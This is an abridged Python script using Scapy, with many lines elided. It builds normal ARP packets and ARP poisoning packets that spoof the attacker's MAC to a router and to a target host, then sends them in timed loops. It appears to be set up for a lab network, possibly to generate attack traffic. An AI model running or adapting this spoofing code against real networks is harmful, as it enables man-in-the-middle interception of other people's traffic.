...
targets_info = {
    ...
    'Sina':  {'target_ip':'10.21.0.18','target_mac':'CA:19:E5:3F:46:F3', 'router_mac': '82:FB:46:AA:C6:E3'}
}

def create_benign_packets(target_mac, target_ip, router_mac):
    ## WHO IS Router? Tell Target
    benign_arp_router = Ether()/ARP()
    benign_arp_router[Ether].src = benign_arp_router[ARP].hwsrc = target_mac
    benign_arp_router[Ether].dst = "ff:ff:ff:ff:ff:ff"
    benign_arp_router[ARP].hwdst = "00:00:00:00:00:00"
    ...
    benign_arp_target[Ether].src = benign_arp_target[ARP].hwsrc = router_mac
    benign_arp_target[Ether].dst = "FF:FF:FF:FF:FF:FF"
    benign_arp_target[ARP].psrc = "10.21.0.5" 
    benign_arp_target[ARP].pdst = target_ip
    benign_arp_target[ARP].hwdst = "00:00:00:00:00:00"
    benign_arp_target[ARP].op = 1

    ## Tell Router, Target MAC
    benign_arp_target_reply = Ether()/ARP()
    benign_arp_target_reply[Ether].src = benign_arp_target_reply[ARP].hwsrc = target_mac
    benign_arp_target_reply[Ether].dst = benign_arp_target_reply[ARP].hwdst = router_mac
    benign_arp_target_reply[ARP].psrc = target_ip
    benign_arp_target_reply[ARP].pdst = "10.21.0.5" 
    benign_arp_target_reply[ARP].op = 2
    return benign_arp_router, benign_arp_target, benign_arp_target_reply
...
def create_arp_poison_packets(attacker_mac, target_mac, target_ip, router_mac):
    ...
    attacker_poison_router[Ether].src = attacker_poison_router[ARP].hwsrc = attacker_mac
    attacker_poison_router[Ether].dst = attacker_poison_router[ARP].hwdst = router_mac
    ...
    attacker_poison_target[Ether].src = attacker_poison_target[ARP].hwsrc = attacker_mac
    attacker_poison_target[Ether].dst = attacker_poison_target[ARP].hwdst = target_mac
...
def run_program(run_time_minutes, attacker_interface, benign_arp_router, benign_arp_target, benign_arp_target_reply, attacker_poison_router, attacker_poison_target):
    ...
    while time.time() < end_time_global:
        ...
        while datetime.now() < end_time_clean_benign: #while loop that runs for the duration of clean up / benign arp
            ...
            #srp1(benign_arp_target, iface=attacker_interface, verbose=0, timeout=1)
            sendp(benign_arp_target_reply, iface=attacker_interface, verbose=0)
            time.sleep(3)
...
def main():
    ...
    benign_arp_router, benign_arp_target, benign_arp_target_reply  = create_benign_packets(target_mac, target_ip, router_mac)
    attacker_poison_router, attacker_poison_target = create_arp_poison_packets(attacker_mac, target_mac, target_ip, router_mac)
    run_program(run_time_minutes, attacker_interface, benign_arp_router, benign_arp_target, benign_arp_target_reply, attacker_poison_router, attacker_poison_target)
